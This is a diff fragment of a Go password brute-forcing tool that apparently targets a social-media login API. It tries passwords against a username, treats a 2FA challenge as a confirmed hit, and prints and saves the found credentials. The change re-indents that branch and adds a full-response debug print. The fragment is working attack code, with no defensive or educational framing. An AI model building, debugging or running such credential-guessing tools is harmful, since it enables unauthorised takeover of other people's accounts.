@@ -81,12 +81,12 @@ func main() {
 		success, response := tryLogin(username, password)
 
 		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
-			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
-			fmt.Printf("Username: %s\n", username)
-			fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
-			saveResult(username, password, true)
-			return
-		} else {
+                fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
+                fmt.Printf("Username: %s\n", username)
+                fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
+               saveResult(username, password, true)
+                return
+                } else {
 			if response.ErrorType == "bad_password" {
 				fmt.Println("❌ Invalid password")
 			} else if response.ErrorType == "invalid_user" {
@@ -94,6 +94,7 @@ func main() {
 				return
 			} else {
 				fmt.Printf("⚠️ Error: %s\n", response.Message)
+                                fmt.Printf("⚠️ Full Response: %+v\n", response)
 			}
 		}
 
